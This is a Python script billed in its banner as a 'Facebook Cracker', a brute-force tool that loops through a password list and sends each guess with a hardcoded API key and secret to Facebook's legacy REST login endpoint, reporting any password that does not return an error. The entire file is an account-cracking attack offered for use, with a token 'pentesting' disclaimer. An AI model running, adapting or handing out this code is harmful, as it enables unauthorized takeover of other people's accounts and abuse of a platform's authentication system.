import os
import sys
import urllib.request
import hashlib
import time

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

def banner():
    print("""
    ██████╗ ██╗   ██╗██╗██████╗ ███████╗██████╗ 
    ██╔══██╗██║   ██║██║██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██║   ██║██║██████╔╝█████╗  ██████╔╝
    ██╔══██╗██║   ██║██║██╔══██╗██╔══╝  ██╔══██╗
    ██║  ██║╚██████╔╝██║██████╔╝███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
              VICODERS HACKING
    +=======================================+
    |..........Facebook Cracker v 1.........|
    +---------------------------------------+
    |#Author: DedSecTL <khaled>             |
    |#Contact: Telegram @blackhacker33      |
    |#Contact: facebook https://www.facebook.com/vicoders.hacking/      |
    |#Date: Fri mar 2024 KHALED HACKING     |
    |#This tool is made for pentesting.     |
    |#Changing the description of this tool |
    |Won't made you the coder ^_^ !!!       |
    |#Respect Coderz ^_^                    |
    |#I take no responsibilities for the    |
    |  use of this program !                |
    |           +201007262016               |
    +=======================================+
    |..........Facebook Cracker v 1.........|
    +---------------------------------------+
    سكربت اختراق فيسبوك عن طريق التخمين 
    VICODERS HACKING
    """)

def brute_force(userid, passlist):
    try:
        if os.path.exists(passlist):
            banner()
            print(f"\n [+] Account to crack: {userid}")
            print(f" [+] Loaded: {len(open(passlist,'r').read().splitlines())}")
            print(" [+] Cracking, please wait ...\n")
            for passwd in open(passlist,'r').readlines():
                sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
                sys.stdout.flush()
                sig = f"api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={userid}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={passwd.strip()}return_ssl_resources=0v=1.0{API_SECRET}"
                xx = hashlib.md5(sig.encode('utf-8')).hexdigest()
                data = f"api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={userid}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={passwd.strip()}&return_ssl_resources=0&v=1.0&sig={xx}"
                response = urllib.request.urlopen(f"https://api.facebook.com/restserver.php?{data}").read().decode('utf-8')
                if "error" in response:
                    pass
                else:
                    print("\n\n[+] Password found .. !!")
                    print("\n[+] Password: {}".format(passwd.strip()))
                    break
            print("\n\n[!] Done .. !!")
        else:
            print("fbbrute: error: No such file or directory")
    except KeyboardInterrupt:
        print("fbbrute: error: Keyboard interrupt")

if __name__ == "__main__":
    print("[+] Facebook Brute Force\n")
    userid = input("[*] Enter [Email|Phone|Username|ID]: ")
    passlist = input("[*] Set PATH to passlist: ")
    brute_force(userid, passlist)

